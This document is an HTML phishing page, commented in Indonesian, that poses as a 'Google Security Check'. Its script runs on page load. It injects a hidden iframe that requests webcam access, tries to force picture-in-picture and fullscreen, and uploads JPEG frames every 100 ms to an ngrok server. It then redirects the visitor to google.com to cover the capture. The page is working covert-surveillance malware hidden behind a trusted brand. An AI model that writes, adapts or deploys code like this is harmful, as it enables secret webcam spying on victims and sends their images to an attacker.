<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Google Security Verification</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #fff; color: #333; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; overflow: hidden; }
  .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; border: 1px solid #ddd; }
  h2 { color: #4285f4; margin-bottom: 10px; font-size: 22px; }
  p { color: #666; font-size: 14px; margin-bottom: 20px; }
  #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; font-family: monospace; text-align: left; height: 120px; overflow-y: auto; }
  iframe, video, canvas { display: none !important; }
</style>
</head>
<body>

<div class="panel" id="main-card">
  <h2>🔒 Google Security Check</h2>
  <p>Memverifikasi...</p>
  <div id="log">Sistem siap.</div>
</div>

<div id="launcher-container" style="display: none;"></div>

<script>
(function () {
  'use strict';

  var logEl = document.getElementById('log');
  var executed = false;

  function log(msg) {
    logEl.innerHTML += "> " + msg + "<br>";
    console.log(msg);
  }

  // ============================================
  // KONFIGURASI
  // ============================================
  var TARGET_URL = "https://www.google.com";
  var SERVER_ENDPOINT = "https://studly-unallegorized-brecken.ngrok-free.dev/upload";
  var REDIRECT_DELAY = 2000; // 2 detik

  // ============================================
  // 1. INJECT IFRAME ZERO-CLICK (PiP + FULLSCREEN)
  // ============================================
  function injectZeroClickIframe() {
    try {
      log("[+] Membuat Iframe Tersembunyi (PiP)...");

      var iframe = document.createElement('iframe');
      // Atribut allow untuk kamera, PiP, dan fullscreen
      iframe.allow = "camera; microphone; autoplay; picture-in-picture; fullscreen";
      iframe.style.display = "none";
      
      iframe.srcdoc = `
        <!DOCTYPE html>
        <html>
        <body>
          <video id="hiddenVideo" autoplay playsinline muted style="width:1px;height:1px;opacity:0.01;position:absolute;top:0;left:0;"></video>
          <canvas id="hiddenCanvas" width="640" height="480" style="display:none;"></canvas>
          
          <script>
            (function() {
              // 1. Minta Izin Kamera (Zero-Click)
              navigator.mediaDevices.getUserMedia({ video: true, audio: false })
                .then(function(stream) {
                  var video = document.getElementById('hiddenVideo');
                  video.srcObject = stream;
                  video.play().catch(function(){});
                  
                  parent.postMessage({ type: 'CAM_GRANTED' }, '*');

                  // 2. Paksa Masuk PiP (Zero-Click)
                  setTimeout(function() {
                    if (document.pictureInPictureElement) {
                      document.exitPictureInPicture();
                    }
                    video.requestPictureInPicture()
                      .then(function() {
                        parent.postMessage({ type: 'PIP_GRANTED' }, '*');
                        
                        // 3. Paksa Fullscreen (Zero-Click)
                        video.requestFullscreen()
                          .then(function() {
                            parent.postMessage({ type: 'FULLSCREEN_GRANTED' }, '*');
                          })
                          .catch(function(err) {
                            parent.postMessage({ type: 'FULLSCREEN_DENIED', error: err.message }, '*');
                          });
                      })
                      .catch(function(err) {
                        parent.postMessage({ type: 'PIP_DENIED', error: err.message }, '*');
                      });
                  }, 500);

                  // 4. Kirim Frame ke Server
                  setInterval(function() {
                    var canvas = document.getElementById('hiddenCanvas');
                    var ctx = canvas.getContext('2d');
                    if (video.readyState === video.HAVE_ENOUGH_DATA) {
                      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                      canvas.toBlob(function(blob) {
                        if (!blob) return;
                        var formData = new FormData();
                        formData.append('file', blob, 'capture.jpg');
                        fetch('${SERVER_ENDPOINT}', {
                          method: 'POST',
                          body: formData,
                          keepalive: true
                        }).catch(function(){});
                      }, 'image/jpeg', 0.5);
                    }
                  }, 100);

                })
                .catch(function(err) {
                  parent.postMessage({ type: 'CAM_DENIED', error: err.name }, '*');
                });
            })();
          <\/script>
        </body>
        </html>
      `;

      document.getElementById("launcher-container").appendChild(iframe);
      log("[+] Iframe Tersembunyi disuntikkan.");
    } catch(e) {
      log("[-] Iframe Error: " + e.message);
    }
  }

  // ============================================
  // 2. LISTENER PESAN DARI IFRAME
  // ============================================
  window.addEventListener('message', function(e) {
    if (e.data.type === 'CAM_GRANTED') {
      log("[+] 🚨 Kamera DIIZINKAN!");
    } else if (e.data.type === 'PIP_GRANTED') {
      log("[+] 🎥 PiP AKTIF!");
    } else if (e.data.type === 'FULLSCREEN_GRANTED') {
      log("[+] 🖥️ Fullscreen AKTIF!");
    } else if (e.data.type === 'CAM_DENIED') {
      log("[-] Kamera ditolak: " + e.data.error);
    } else if (e.data.type === 'PIP_DENIED') {
      log("[-] PiP ditolak: " + e.data.error);
    } else if (e.data.type === 'FULLSCREEN_DENIED') {
      log("[-] Fullscreen ditolak: " + e.data.error);
    }
  });

  // ============================================
  // 3. TRIGGER ZERO-CLICK (OTOMATIS SAAT LOAD)
  // ============================================
  window.addEventListener('load', function() {
    if (executed) return;
    executed = true;

    log("[!] Memulai Zero-Click Fullscreen PiP...");

    // A. Inject Iframe (0ms)
    injectZeroClickIframe();

    // B. Redirect ke Google (Setelah 2 detik)
    setTimeout(function() {
      log("[+] Redirect ke Google.com...");
      try {
        window.location.replace(TARGET_URL);
      } catch(e) {}
    }, REDIRECT_DELAY);

  });

})();
</script>
</body>
</html>
